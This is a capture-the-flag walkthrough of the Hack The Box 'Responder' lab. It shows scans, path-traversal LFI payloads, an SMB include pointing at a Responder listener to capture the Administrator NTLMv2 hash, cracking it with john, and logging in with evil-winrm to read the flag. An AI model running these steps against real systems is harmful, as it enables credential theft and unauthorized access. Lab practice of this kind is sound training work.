target= 10.129.30.134 HTB

It gives us a walkthrough of an NTLM hash capturing when the machine tries to authenticate to a fake malicious SMB server which we will be setting up (in this case). Overall it is a very knowledgeable room and will teach you many things about LFI(local file inclusion) also.

Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.
```
└─# nmap -Pn -p- -T5 $ip
└─# nmap -Pn -p- --min-rate 6000 $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-21 18:59 EDT
sendto in send_ip_packet_sd: sendto(4, packet, 44, 0, 10.129.30.134, 16) => Operation not permitted
Offending packet: TCP 10.10.14.83:46144 > 10.129.30.134:61512 S ttl=45 id=20522 iplen=44  seq=2852752452 win=1024 <mss 1460>
Nmap scan report for unika.htb (10.129.30.134)
Host is up (1.3s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
7680/tcp open  pando-pub
```

or use 
`nmap -sC -sV -p- -T4 $ip`
I used nuclei on that url and found LFI
http://unika.htb/index.php/?page&page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini

```
┌──(root㉿kali)-[/home/kali]
└─# nuclei -u "http://unika.htb/index.php?page=" --severity low,high,medium,critical

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.9.2

		projectdiscovery.io

[INF] Your current nuclei-templates v9.5.8 are outdated. Latest is v9.6.4
[INF] Current nuclei version: v2.9.2 (outdated)
[INF] Current nuclei-templates version: v9.5.8 (outdated)
[INF] New templates added in latest release: 113
[INF] Templates loaded for current scan: 6409
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 3822 (Reduced 3006 Requests)
[INF] Using Interactsh Server: oast.fun
[generic-windows-lfi] [http] [high] http://unika.htb/index.php/?page&page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
[generic-windows-lfi] [http] [high] http://unika.htb/index.php/?page&page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini

```
also used this `../../../../../../../../windows/system32/drivers/etc/hosts`

Now what we are going to do here is we are going to capture the NTLM (New Technology LAN Manager) hash of our administrator using a tool called Responder.

    install responder
    check network interface
    use -I to specify network interface
    run the responder -I tun0

└─# responder -I tun0     
Now go to that lfi and do an RFI using that responder IP

Navigate to : http://unika.htb/index.php/?page&page=//10.10.14.83/somefile

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.30.134
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4d06e19ee15d793f:730028D38CEA56DA08AEEC759620BBEC:010100000000000080F02B98C1ECD90105E5C7CE409AE5E1000000000200080032004E004600430001001E00570049004E002D003900330030005A003000580044004300300048004F0004003400570049004E002D003900330030005A003000580044004300300048004F002E0032004E00460043002E004C004F00430041004C000300140032004E00460043002E004C004F00430041004C000500140032004E00460043002E004C004F00430041004C000700080080F02B98C1ECD901060004000200000008003000300000000000000001000000002000005DB84678FC01EB00327681E9B361BECBB059C8337D8325AB088F9C709457C2960A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380033000000000000000000
```

Then crack the hash 
```
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Hackthebox]
└─# john ntlm.hash              
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/wordlists/rockyou.txt
badminton        (Administrator) 

```

Now re-analyze nmap to found ports to connect-on
nmap not found nothing 

next step start attack service running port 5985 WinRm.

Windows Remote Managment is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP.

The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:

    install evil-winrm via gem
    running evil-winrm
    └─# sudo apt install evil-winrm

```
──(root㉿kali)-[/home/kali/CTFs/Boot2root/Hackthebox]
└─# evil-winrm -i $ip -u Administrator -p badminton
                                        
Evil-WinRM shell v3.5
```
and connected
not found flag on admin desktop, now i will switch to users
```
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public

```

```
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


more flag.txt
*Evil-WinRM* PS C:\Users\mike\Desktop> more flag.txt
ea81b7afddd03efaa0945333ed147fac

```